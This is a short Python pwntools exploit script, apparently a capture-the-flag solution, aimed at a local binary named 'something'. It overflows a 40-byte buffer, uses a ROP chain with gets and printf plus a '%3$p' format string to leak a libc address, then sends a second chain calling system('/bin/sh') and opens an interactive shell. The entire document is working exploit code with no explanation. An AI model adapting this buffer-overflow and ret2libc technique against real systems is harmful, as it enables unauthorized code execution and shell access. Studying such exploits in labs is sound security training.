from pwn import *

r = process("./something")
gdb.attach(r, api= True)

print(r.recvuntil(b"something : "))

gets = 0x401090
printf = 0x401080
pop_rdi_ret = 0x00000000004012a3
format_string = 0x404500
ret_gadget = 0x000000000040101a
stdin_func_offset_of_libc = 0x0000000000219aa0
vuln_func_address = 0x00000000004011dd
system_func_offset = 0x0000000000050d60
binsh_string_offset = 0x1d8698

payload = b"A"*40 + p64(ret_gadget) +p64(pop_rdi_ret) + p64(format_string) +p64(gets)
payload += p64(ret_gadget) + p64(pop_rdi_ret) + p64(format_string) +p64(printf)
payload += p64(ret_gadget) + p64(vuln_func_address)
r.sendline(payload)

payload = b"%3$p"
r.sendline(payload)

output = r.recvuntil(b"something : ")
print(output)
stdin_address = int(output.split(b"Say")[0],16)

libc_base = stdin_address - stdin_func_offset_of_libc
print(hex(libc_base))

system_address = libc_base + system_func_offset
binsh_string_address =libc_base + binsh_string_offset

payload = b"A"*40 + p64(ret_gadget) + p64(pop_rdi_ret) + p64(binsh_string_address) +p64(system_address)

r.sendline(payload)

r.interactive()